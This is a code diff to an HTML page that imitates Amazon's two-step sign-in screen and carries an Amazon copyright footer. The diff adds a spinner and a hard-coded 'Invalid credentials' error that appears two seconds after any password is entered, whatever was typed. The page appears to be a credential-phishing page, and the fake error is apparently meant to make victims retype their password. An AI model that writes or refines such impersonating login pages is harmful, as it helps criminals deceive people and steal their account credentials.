@@ -134,6 +134,31 @@
       margin-top: 10px;
       color: #555;
     }
+
+    /* Spinner CSS */
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #3498db;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      display: none; /* Hidden by default */
+      margin: 20px auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* Error message */
+    .error-message {
+      color: red;
+      display: none;
+      font-size: 14px;
+      margin-top: 20px;
+    }
   </style>
 </head>
 <body>
@@ -165,6 +190,12 @@
     <a href="#">Help</a>
     <p>&copy; 1996-2024, Amazon.com, Inc. or its affiliates</p>
   </footer>
+
+  <div class="spinner" id="spinner"></div>
+  <div class="error-message" id="error-message">
+    Error: Invalid credentials. Please try again.
+  </div>
+
   <script>
     function showPasswordScreenWithDelay() {
       // Get the email value
@@ -172,6 +203,7 @@
 
       // Add a delay before switching to the password screen
       setTimeout(() => {
+        // Hide the initial form and show spinner
         document.getElementById('form-container').innerHTML = `
           <h1>Sign in</h1>
           <p>${email} <a href="#" onclick="goBack()">Change</a></p>
@@ -184,7 +216,17 @@
             <button type="submit" class="button">Sign in</button>
           </form>
         `;
-      }, 1000); // 1-second delay
+        
+        // Show spinner after the delay
+        document.getElementById('spinner').style.display = 'block';
+
+        // Simulate a delay before showing error
+        setTimeout(() => {
+          // Hide the spinner and show the error message
+          document.getElementById('spinner').style.display = 'none';
+          document.getElementById('error-message').style.display = 'block';
+        }, 2000); // 2-second delay to simulate loading and error message display
+      }, 1000); // 1-second delay to simulate transition to password screen
     }
 
     function goBack() {
